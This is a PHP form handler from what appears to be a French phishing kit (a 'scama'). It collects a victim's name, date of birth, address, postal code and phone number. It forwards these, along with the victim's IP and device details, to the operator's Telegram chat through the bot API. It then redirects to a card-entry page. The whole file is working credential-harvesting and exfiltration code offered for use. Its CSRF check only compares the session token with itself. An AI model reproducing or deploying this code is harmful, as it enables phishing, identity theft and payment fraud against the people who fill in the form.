<?php
declare(strict_types=1);
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

ob_start();
session_start();
date_default_timezone_set('Europe/Paris');
header('Content-Type: application/json');
require_once __DIR__ . '/../modules/load_config.php';
require_once __DIR__ . '/../modules/sessions.php';

require_once __DIR__ . '/../func/counter.php'; 

$bot_token = getConfig('BOT_TOKEN', '');
$chat_info   = getConfig('CHAT_INFO', '');
$name_scama   = getConfig('SCAMA_NAME', '');
$BILLING_NOTIF   = getConfig('BILLING_NOTIF', 1);// Notif info 

//------- INFOS CLIENTS --------------------//
$ip          = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Inconnu';
$device_type = $_SESSION['visitor']['device_type'] ?? 'Inconnu';
$device      = $_SESSION['visitor']['device_model'] ?? 'Inconnu';
$datetime    = date('d/m/Y H:i:s');
$uid         = $_SESSION['user_id'] ?? uniqid('user_', true);

//--------------------------------------//



// ---------------------------
//      Protection BOT
// ---------------------------
$token = $_SESSION['csrf_token'] ?? '';

if (!hash_equals($_SESSION['csrf_token'] ?? '', $token)) {
    http_response_code(403);
    exit('Error: Invalid CSRF token');
}


if (empty($bot_token) || empty($chat_info)) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => 'Aucune clé télégram configurée. Regarde le config.php']);
    exit;
}


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Méthode non autorisée.');
}


if (empty($_POST['nom']) || empty($_POST['prenom']) || empty($_POST['dob'])|| empty($_POST['adresse'])|| empty($_POST['ville'])  || empty($_POST['cp']) || empty($_POST['tel'])             ) {
    ob_end_clean();              
   header('Location: ../pages/infos.php?error=error');
    exit;
}



$ip = filter_var($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) ?: 'Inconnu';
$counterFile = __DIR__ . '/../func/counter_page.json';
//Compteur de login
incrementCounterByIP('infos', $ip, $counterFile);


// ---------------------------
//      Récupération & nettoyage données POST
// ---------------------------

$nom = htmlspecialchars($_POST['nom'], ENT_QUOTES, 'UTF-8') ?? '';
$prenom= htmlspecialchars($_POST['prenom'], ENT_QUOTES, 'UTF-8') ?? '';
$dob= htmlspecialchars($_POST['dob'], ENT_QUOTES, 'UTF-8') ?? '';
$adresse= htmlspecialchars($_POST['adresse'], ENT_QUOTES, 'UTF-8') ?? '';
$ville= htmlspecialchars($_POST['ville'], ENT_QUOTES, 'UTF-8') ?? '';
$cp= htmlspecialchars($_POST['cp'], ENT_QUOTES, 'UTF-8') ?? '';
$tel= htmlspecialchars($_POST['tel'], ENT_QUOTES, 'UTF-8') ?? '';

$_SESSION['prenom']  = $prenom;
$_SESSION['nom']  = $nom;
$_SESSION['dob']  = $dob;
$_SESSION['adresse']  = $adresse;
$_SESSION['ville']  = $ville;
$_SESSION['cp']  = $cp;
$_SESSION['tel']  = $tel;




// ---------------------------
//     CLIENT
// ---------------------------

function sendTelegramMessage(string $bot_token, string $chat_info, string $text, ?array $reply_markup = null, string $parse_mode = 'HTML'): array {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $post_fields = [
        'chat_id'    => $chat_info,
        'text'       => $text,
        'parse_mode' => $parse_mode,
    ];

    if ($reply_markup !== null) {
        $post_fields['reply_markup'] = json_encode($reply_markup);
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);

    $result = curl_exec($ch);
    if ($result === false) {
        throw new Exception("cURL Error: " . curl_error($ch));
    }

    curl_close($ch);
    $response = json_decode($result, true);

    if (!$response || !$response['ok']) {
        $desc = $response['description'] ?? 'Erreur inconnue';
        throw new Exception("Telegram API Error: $desc");
    }

    return $response;
}

if ($BILLING_NOTIF == 1) {

$message_text = "
<blockquote>📁<b>  Infos | {$name_scama}</b></blockquote>

<b>📝 Informations </b>
├ 👤 Nom : <code>{$nom}</code>
├ 👤 Prénom : <code>{$prenom}</code>
├ 🎂 Date de naissance : <code>{$dob}</code>        
├ 🏠 Adresse : <code>{$adresse}</code>
├ 🏙️ Ville : <code>{$ville}</code>
├ 📮 Code postal : <code>{$cp}</code>
└ 📞 Téléphone : <code>{$tel}</code>


<b>🖥️ Infos système</b>
├ 🌐 IP : <code>{$ip}</code>
├ 💻 Type : <code>{$device_type} | 📱 Modèle : {$device}</code>
└ 📅 Date : <code>{$datetime}</code>

<blockquote>📍 {$name_scama}  [$datetime]
└ Xcode_officiel : [© " . date('Y') . " - All rights reserved.]</blockquote>
";

try {
    sendTelegramMessage($bot_token, $chat_info, $message_text);
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => "Erreur Telegram : " . $e->getMessage()]);
    exit;
}
}

ob_end_clean();
header('Location: ../pages/carte.php');
exit;
